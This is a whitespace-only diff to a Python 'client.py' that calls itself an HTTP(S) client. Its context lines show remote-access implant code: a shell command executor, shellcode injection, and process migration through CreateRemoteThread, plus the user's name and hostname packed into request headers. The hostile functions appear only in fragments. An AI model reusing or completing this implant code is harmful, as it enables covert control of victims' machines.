@@ -56,7 +56,6 @@ CERT = None
 SERVER = None
 shellcode = ""
 
-
 def console():
     parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
                 formatter_class=RawTextHelpFormatter)
@@ -65,19 +64,15 @@ def console():
                 type=validateServer,
                 default=None, required=False, metavar='',
                 help="Specify an HTTP(S) server to connect to.")
-
     parser.add_argument('-c', "--cert",
                 required=False, metavar='',
                 help="Specify a certificate to use.")
-
     parser.add_argument('-p', "--proxy",
                 type=validateProxy,
                 default=None, required=False, metavar='',
                 help="Specify a proxy to use [form: host:port]")
-
     args = parser.parse_args()
     return args
-
 
 def validateServer(url):
     try:
@@ -92,7 +87,6 @@ def validateServer(url):
     except Exception as error:
         raise error
 
-
 def validatePort(port):
     if isinstance(int(port), int):
         if 1 < int(port) < 65536:
@@ -102,14 +96,12 @@ def validatePort(port):
     else:
         raise ArgumentTypeError('Port must be in range 1-65535')
 
-
 def validateIP(ip):
     try:
         if socket.inet_aton(ip):
             return ip
     except socket.error:
         raise ArgumentTypeError('[x] Invalid IP provided')
-
 
 def validateProxy(proxy):
     if not ':' in proxy or proxy.count(':') != 1:
@@ -119,7 +111,6 @@ def validateProxy(proxy):
         if validateIP(host) and validatePort(port):
             return proxy
 
-
 def valid_file(filepath):
     try:
         if not os.path.isfile(filepath):
@@ -127,7 +118,6 @@ def valid_file(filepath):
         return True if os.access(filepath, os.R_OK) else False
     except:
         return False
-
 
 def current_dir(cwd):
     try:
@@ -139,7 +129,6 @@ def current_dir(cwd):
         cwd_name = '/'
     return cwd_name
 
-
 def exec_cmd(cmd):
     cmd_output = subprocess.Popen(cmd,
         shell=True,
@@ -147,14 +136,11 @@ def exec_cmd(cmd):
         stderr=subprocess.STDOUT)
     return cmd_output.communicate()
 
-
 def abs_path(file):
     return os.path.abspath(file)
 
-
 def is_os_64bit():
     return platform.machine().endswith('64')
-
 
 def inject_shellcode():
     try:
@@ -166,7 +152,6 @@ def inject_shellcode():
     except Exception as error:
         return error
 
-
 def migrate_res(pid, retcode):
     result = {
         1 : "Shellcode successfully injected on PID: {} ".format(pid),
@@ -174,7 +159,6 @@ def migrate_res(pid, retcode):
         3 : "Failed to inject shellcode on process with PID: {} ".format(pid)
     }
     return result[retcode]
-
 
 def migrate_to_pid(pid):
     """
@@ -189,7 +173,6 @@ def migrate_to_pid(pid):
         return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
     except Exception as error:
         return 3
-
 
 username, error = exec_cmd("whoami")
 if os.name=='nt':
@@ -208,7 +191,6 @@ _headers = {
     "hostname" : hostname.strip(),
     "directory": cwd
 }
-
 
 try:
     args = console()
